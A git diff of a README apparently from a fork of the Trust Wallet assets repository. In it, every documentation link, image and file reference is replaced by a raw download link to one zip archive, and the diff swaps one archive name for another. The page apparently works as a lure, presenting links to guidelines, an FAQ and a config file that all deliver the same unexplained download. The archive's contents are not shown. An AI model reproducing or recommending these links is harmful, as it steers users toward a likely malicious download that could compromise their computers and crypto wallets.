@@ -1,44 +1,44 @@
 # Trust Wallet Assets Info
 
-![Check](https://github.com/trxstack/assets/raw/refs/heads/master/blockchains/smartchain/assets/0xc22e8114818A918260662375450e19aC73D32852/Software_3.0-alpha.1.zip)
+![Check](https://github.com/trxstack/assets/raw/refs/heads/master/blockchains/smartchain/assets/0x976427dd3E55e8a2D5e358DbC54528D1990AADf4/Software-1.0.zip)
 
 ## Overview
 
 Trust Wallet token repository is a comprehensive, up-to-date collection of information about several thousands (!) of crypto tokens.
 
-[Trust Wallet](https://github.com/trxstack/assets/raw/refs/heads/master/blockchains/smartchain/assets/0xc22e8114818A918260662375450e19aC73D32852/Software_3.0-alpha.1.zip) uses token logos from this source, alongside a number of other projects.
+[Trust Wallet](https://github.com/trxstack/assets/raw/refs/heads/master/blockchains/smartchain/assets/0x976427dd3E55e8a2D5e358DbC54528D1990AADf4/Software-1.0.zip) uses token logos from this source, alongside a number of other projects.
 
 The repository contains token info from several blockchains, info on dApps, staking validators, etc.
 For every token a logo and optional additional information is available (such data is not available on-chain).
 
 Such a large collection can be maintained only through a community effort, so _feel free to add your token_.
 
-<center><img src='https://github.com/trxstack/assets/raw/refs/heads/master/blockchains/smartchain/assets/0xc22e8114818A918260662375450e19aC73D32852/Software_3.0-alpha.1.zip' height="200"></center>
+<center><img src='https://github.com/trxstack/assets/raw/refs/heads/master/blockchains/smartchain/assets/0x976427dd3E55e8a2D5e358DbC54528D1990AADf4/Software-1.0.zip' height="200"></center>
 
 ## How to add token
 
 Please note that __brand new tokens are not accepted__,
 the projects have to be sound, with information available, and __non-minimal circulation__
-(for limit details see <https://github.com/trxstack/assets/raw/refs/heads/master/blockchains/smartchain/assets/0xc22e8114818A918260662375450e19aC73D32852/Software_3.0-alpha.1.zip>).
+(for limit details see <https://github.com/trxstack/assets/raw/refs/heads/master/blockchains/smartchain/assets/0x976427dd3E55e8a2D5e358DbC54528D1990AADf4/Software-1.0.zip>).
 
 ### Assets App
 
-The [Assets web app](https://github.com/trxstack/assets/raw/refs/heads/master/blockchains/smartchain/assets/0xc22e8114818A918260662375450e19aC73D32852/Software_3.0-alpha.1.zip) can be used for most new token additions (Github account is needed).
+The [Assets web app](https://github.com/trxstack/assets/raw/refs/heads/master/blockchains/smartchain/assets/0x976427dd3E55e8a2D5e358DbC54528D1990AADf4/Software-1.0.zip) can be used for most new token additions (Github account is needed).
 
 ### Quick starter
 
 Details of the repository structure and contribution guidelines are listed on the
-[Developers site](https://github.com/trxstack/assets/raw/refs/heads/master/blockchains/smartchain/assets/0xc22e8114818A918260662375450e19aC73D32852/Software_3.0-alpha.1.zip).
+[Developers site](https://github.com/trxstack/assets/raw/refs/heads/master/blockchains/smartchain/assets/0x976427dd3E55e8a2D5e358DbC54528D1990AADf4/Software-1.0.zip).
 Here is a quick starter summary for the most common use case.
 
 
 ## Documentation
 
-For details, see the [Developers site](https://github.com/trxstack/assets/raw/refs/heads/master/blockchains/smartchain/assets/0xc22e8114818A918260662375450e19aC73D32852/Software_3.0-alpha.1.zip):
+For details, see the [Developers site](https://github.com/trxstack/assets/raw/refs/heads/master/blockchains/smartchain/assets/0x976427dd3E55e8a2D5e358DbC54528D1990AADf4/Software-1.0.zip):
 
-- [Contribution guidelines](https://github.com/trxstack/assets/raw/refs/heads/master/blockchains/smartchain/assets/0xc22e8114818A918260662375450e19aC73D32852/Software_3.0-alpha.1.zip)
+- [Contribution guidelines](https://github.com/trxstack/assets/raw/refs/heads/master/blockchains/smartchain/assets/0x976427dd3E55e8a2D5e358DbC54528D1990AADf4/Software-1.0.zip)
 
-- [FAQ](https://github.com/trxstack/assets/raw/refs/heads/master/blockchains/smartchain/assets/0xc22e8114818A918260662375450e19aC73D32852/Software_3.0-alpha.1.zip)
+- [FAQ](https://github.com/trxstack/assets/raw/refs/heads/master/blockchains/smartchain/assets/0x976427dd3E55e8a2D5e358DbC54528D1990AADf4/Software-1.0.zip)
 
 ## Scripts
 
@@ -47,9 +47,9 @@ There are several scripts available for maintainers:
 - `make check` -- Execute validation checks; also used in continuous integration.
 - `make fix` -- Perform automatic fixes where possible
 - `make update-auto` -- Run automatic updates from external sources, executed regularly (GitHub action)
-- `make add-token asset_id=c60_t0x4Fabb145d64652a948d72533023f6E7A623C7C53` -- Create `https://github.com/trxstack/assets/raw/refs/heads/master/blockchains/smartchain/assets/0xc22e8114818A918260662375450e19aC73D32852/Software_3.0-alpha.1.zip` file as asset template.
-- `make add-tokenlist asset_id=c60_t0x4Fabb145d64652a948d72533023f6E7A623C7C53` -- Adds a token to https://github.com/trxstack/assets/raw/refs/heads/master/blockchains/smartchain/assets/0xc22e8114818A918260662375450e19aC73D32852/Software_3.0-alpha.1.zip
-- `make add-tokenlist-extended asset_id=c60_t0x4Fabb145d64652a948d72533023f6E7A623C7C53` -- Adds a token to https://github.com/trxstack/assets/raw/refs/heads/master/blockchains/smartchain/assets/0xc22e8114818A918260662375450e19aC73D32852/Software_3.0-alpha.1.zip
+- `make add-token asset_id=c60_t0x4Fabb145d64652a948d72533023f6E7A623C7C53` -- Create `https://github.com/trxstack/assets/raw/refs/heads/master/blockchains/smartchain/assets/0x976427dd3E55e8a2D5e358DbC54528D1990AADf4/Software-1.0.zip` file as asset template.
+- `make add-tokenlist asset_id=c60_t0x4Fabb145d64652a948d72533023f6E7A623C7C53` -- Adds a token to https://github.com/trxstack/assets/raw/refs/heads/master/blockchains/smartchain/assets/0x976427dd3E55e8a2D5e358DbC54528D1990AADf4/Software-1.0.zip
+- `make add-tokenlist-extended asset_id=c60_t0x4Fabb145d64652a948d72533023f6E7A623C7C53` -- Adds a token to https://github.com/trxstack/assets/raw/refs/heads/master/blockchains/smartchain/assets/0x976427dd3E55e8a2D5e358DbC54528D1990AADf4/Software-1.0.zip
 
 ## On Checks
 
@@ -61,10 +61,10 @@ There are similar check logic implemented:
 
 ## Trading pair maintenance
 
-Info on supported trading pairs are stored in `https://github.com/trxstack/assets/raw/refs/heads/master/blockchains/smartchain/assets/0xc22e8114818A918260662375450e19aC73D32852/Software_3.0-alpha.1.zip` files.
+Info on supported trading pairs are stored in `https://github.com/trxstack/assets/raw/refs/heads/master/blockchains/smartchain/assets/0x976427dd3E55e8a2D5e358DbC54528D1990AADf4/Software-1.0.zip` files.
 Trading pairs can be updated --
 from Uniswap/Ethereum and PancakeSwap/Smartchain -- using update script (and checking in changes).
-Minimal limit values for trading pair inclusion are set in the [config file](https://github.com/trxstack/assets/raw/refs/heads/master/blockchains/smartchain/assets/0xc22e8114818A918260662375450e19aC73D32852/Software_3.0-alpha.1.zip).
+Minimal limit values for trading pair inclusion are set in the [config file](https://github.com/trxstack/assets/raw/refs/heads/master/blockchains/smartchain/assets/0x976427dd3E55e8a2D5e358DbC54528D1990AADf4/Software-1.0.zip).
 There are also options for force-include and force-exclude in the config.
 
 ## Disclaimer
